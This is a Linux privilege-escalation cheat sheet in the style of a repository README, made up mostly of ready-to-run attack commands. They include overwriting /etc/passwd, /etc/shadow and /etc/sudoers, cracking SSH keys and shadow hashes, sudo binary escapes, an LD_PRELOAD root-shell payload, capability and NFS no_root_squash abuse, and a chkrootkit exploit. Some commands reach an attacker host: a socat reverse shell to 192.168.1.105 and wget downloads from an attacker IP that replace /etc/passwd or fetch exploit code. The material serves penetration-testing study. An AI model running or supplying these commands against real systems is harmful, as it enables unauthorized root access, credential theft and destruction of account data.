# Linux-Privilege-Escalation-Basics
Simple and accurate guide for linux privilege escalation tactics 

# Privilege Escalation Methods

- Basic System Enumeration
- Bash History
- OpenVPN Credentials
- Writable Files
- SSH Private Keys 
- Kernel Expliots
- Sudo -l 
- Sudo CVE 
- Sudo LD_PRELOAD
- SUID / GUID Binaries
- Capabilities
- NFS Root Squashing
- chkrootkit 0.49


# Basic System Enumeration
Structure : Linux Command // <Comment / Tip>
```
uname -a // What OS kernel are we using?
hostname // What is my hostname?
lscpu // What is our CPU architecture?
ls /home // Any Users? Can we access their home directories?
ls /var/www/html // Any web config files? Do they contain DB or user credentials?
ps aux | grep root // What services are running as root? Any cron jobs running specific files as root? Can we write to those files? 
netstat -tulpn // What is running? Are they bound to local host but not from the public? Possible port forwarding
ps -aux | grep root | grep mysql // Is MySQL running as root?
ifconfig // What is our IP? Are we dual-homed?
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; // Any files that contains clear-text credentials?
locate pass | more // Any files with the name pass?

```
# Bash History
Structure : Linux Command // <Comment / Tip>
```
history                             // Any clear-text credentials? Any command for logging into services with the credentials?
cat /home/<user>/.bash_history      // Can we see CLI history of other users?
cat ~/.bash_history | grep -i passw // Any clear-text credentials?

```

# OpenVPN Credentials
Structure : Linux Command // <Comment / Tip>
```
locate *.ovpn                       // Any OpenVPN files with clear-text credentials?

```

# Writable Password Files
If you have write permission to the following files:

- /etc/passwd
- /etc/shadow
- /etc/sudoers

Structure : Linux Command // <Comment / Tip>

/etc/passwd
```
   echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
   su - hacker
   id && whoami
   
OR
   
  vi /etc/passwd
  Remote X (Password Holder) for root
  wg!
  su root
  id && whoami
  
OR

  echo root::0:0:root:/root:/bin/bash > /etc/passwd // Remove Root's Password
  
```  
/etc/shadow 
```  

   Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
   Copy the output
   vi /etc/shadow
   Replace root's hash with the output that you generated
   wq!
   su root // Provide the new root password you generated (Example: NewRootPassword)
   id && whoami
   
```    
/etc/sudoers
```    
   echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers // Replace "Username" with your current user (Example: www-data)
   sudo su
   id && whoami

   ```
# SSH Private Keys 

Structure : Linux Command / <Comment / Tip>

```
find / -name authorized_keys 2> /dev/null              // Any Public Keys?
find / -name id_rsa 2> /dev/null                       // Any SSH private keys? 

   Copy id_rsa contents of keys found with the above command
   Create a local file on your box and paste the content in
   chmod 600 <local_file>
   ssh -i <local_file> user@IP
   
   // Is the key password protected?

   ssh2john <local_file> > hash
   john hash --wordlist=/usr/share/wordlists/rockyou.txt
   
```

# Kernel Expliots

Structure : Linux Command // <Comment / Tip>
```
uname -a // What OS kernel are we using?

// Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
// Read the expliots and follow the instructions
// Popular Linux Kernel Exploits

Dirty COW (CVE-2016-5195)
URL: https://dirtycow.ninja/

Other Kernel Expliots
URL: https://github.com/SecWiki/linux-kernel-exploits

```

# Sudo -l

Sudo -l // What binaries can we execute with Sudo?

// Example Output

User www-data may run the following commands on <hostname>

- (root) NOPASSWD: /usr/bin/find
- (root) NOPASSWD: /usr/bin/nmap
- (root) NOPASSWD: /usr/bin/env
- (root) NOPASSWD: /usr/bin/vim
- (root) NOPASSWD: /usr/bin/awk
- (root) NOPASSWD: /usr/bin/perl
- (root) NOPASSWD: /usr/bin/python
- (root) NOPASSWD: /usr/bin/less
- (root) NOPASSWD: /usr/bin/man
- (root) NOPASSWD: /usr/bin/ftp
- (root) NOPASSWD: /usr/bin/socat
- (root) NOPASSWD: /usr/bin/zip
- (root) NOPASSWD: /usr/bin/gcc
- (root) NOPASSWD: /usr/bin/docker
- (root) NOPASSWD: /usr/bin/env
- (root) NOPASSWD: /usr/bin/MySQL
- (root) NOPASSWD: /usr/bin/ssh
- (root) NOPASSWD: /usr/bin/tmux
- (root) NOPASSWD: /usr/bin/pkexec
- (root) NOPASSWD: /usr/bin/rlwrap
- (root) NOPASSWD: /usr/bin/xargs
- (root) NOPASSWD: /usr/bin/anansi_util
- (root) NOPASSWD: /usr/bin/wget




Absuing Sudo binaries to gain root
----------------------------------------------------
find
```
sudo find / etc/passwd -exec /bin/bash \;
```

Nmap
```
echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

Env
```
sudo env /bin/bash
```

Vim
```
sudo vim -c ':!/bin/bash'
```

Awk
```
sudo awk 'BEGIN {system("/bin/bash")}'
```

Perl
```
sudo perl -e 'exec "/bin/bash";'
```

Python
```
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

Less
```
sudo less /etc/hosts - !bash
```

Man
```
sudo man man - !bash
```

ftp
```
sudo ftp - ! /bin/bash
```

socat
```
Attacker = Attacker= socat file:`tty`,raw,echo=0 tcp-listen:1234
Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
```

Zip
```
echo test > notes.txt
sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
```

gcc
```
sudo gcc -wrapper /bin/bash,-s .
```

Docker
```
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

MySQL
```
sudo mysql -e '\! /bin/sh'
```

SSH
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Tmux
```
Sudo tmux
```

pkexec
```
sudo pkexec /bin/bash
```

rlwrap
```
sudo rlwrap /bin/bash
```

xargs
```
sudo xargs -a /dev/null sh
```

anansi_util
```
sudo /home/anansi/bin/anansi_util manual /bin/bash  
```

Wget

Victim
```
cp /etc/passwd /tmp/passwd
cat /etc/passwd

```
Attacker

```
Copy /etc/passwd content and put in a local file called passwd
Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
Copy output of the above command 
edit passwd
Replace x in root's line with the copied output
Save the file
python -m SimpleHTTPServer 9000 // You can use any port

```

Victim

```
sudo wget http://<attacker_ip>:9000/passwd -O /etc/passwd
su root // Enter the new root password you generated (Example: NewRootPassword)
id && whoami

```


# Sudo CVE
Expliot sudo with known CVE

CVE:

- CVE-2019-14287
- CVE-2019-16634

CVE-2019-14287

sudo -V // Get sudo version
sudo -l

Vulnerable output 
Output = (ALL,!root) NOPASSWD: /bin/bash 

```   
    sudo -u#-1 /bin/bash
    id && whoami
    
```

CVE-2019-16634

sudo -V // Get sudo version

sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled

Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634

Download expliot.c
Upload to Victim 

Attacker
```
python -m SimpleHTTPServer 9000 // You can use any port

```

Victim

```
wget http://<attacker_ip>:9000/expliot.c
Compile expliot.c: gcc expliot.c -o expliot
./expliot
id && whoami 

```

# Sudo LD_PRELOAD

Structure : Linux Command // <Comment / Tip>

sudo -l 

Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?

Expliot

```

cd /tmp
vi priv.c
   
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

Compile priv.c: gcc -fPIC -shared -o priv.so priv.c -nostartfiles
Command: sudo LD_PRELOAD=/tmp/priv.so awk // awk can be replaced with any sudo binary

```

# SUID / GUID Binaries
Structure : Linux Command // <Comment / Tip>

```
Basic Enumeration

----------------------------------------------------------------------

find / -perm -u=s -type f 2>/dev/null // Any Intresting binaries with SUID permissions?
find / -perm -g=s -type f 2>/dev/null // Any Intresting binaries with GUID permissions?
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; // Any Intresting binaries for SUID permissions?
find / -uid 0 -perm -4000 -type f 2>/dev/null // Any Intresting binaries for SUID permissions?

// Look for any binaries that seem odd. Any binaries running from a users home directory?
// Check the version of any odd binaries and see if there are any public expliots that can be used to gain root

Create a Simple Basic SUID binary

---------------------------------------------------------------------


```

# Capabilities

Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0).

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.

Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root.

Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file.

- Python
- Perl
- Tar

Python

```
getcap -r / 2>/dev/null         
/usr/bin/python2.6 = cap_setuid+ep
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

OR

getcap -r / 2>/dev/null  
/usr/bin/python3 = cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

```

Perl

```
getcap -r / 2>/dev/null         
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
id && whoami

```

Tar

```
Victim

getcap -r / 2>/dev/null         
/usr/bin/tar = cap dac read search+ep
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/passwd
Copy content of users accounts to a local file called shadow

Attacker

john shadow --wordlist=/usr/share/wordlists/rockyou.txt
Crack root's credentials

Victim

su root
id && whoami


```

# NFS Root Squashing

Victim
```


cat /etc/exports             // Do we see any no_root_squash enabled on a mounted share?

/tmp *(rw,sync,insecure,no_root_squash,no,subtree,check)  
```

Attacker

```

showmount -e <victim_ip>                      
mkdir /tmp/mount                                
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mount/priv.c  
gcc /tmp/mount/priv.c -o /tmp/mount/priv
chmod +s /tmp/mount/priv

OR

showmount -e <victim_ip>   
mkdir /tmp/mount 
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
cd /tmp/mount
cp /bin/bash .
chmod +s bash


```
```
Victim

cd /tmp
./priv
id && whoami

OR

cd /tmp
./bash -p
id && whoami

```

# chkrootkit 0.49

```
Expliot: https://www.exploit-db.com/exploits/33899

cat /etc/cron.daily

/usr/bin/chkrootkit
ls -la /usr/bin/chkrootkit     // Do we have SUID?
chkrootkit -V
echo "#!/bin/bash" > /tmp/update
echo "chmod +s /bin/bash" >> /tmp/update
Wait a While ...
/bin/bash -p
id && whoami

```
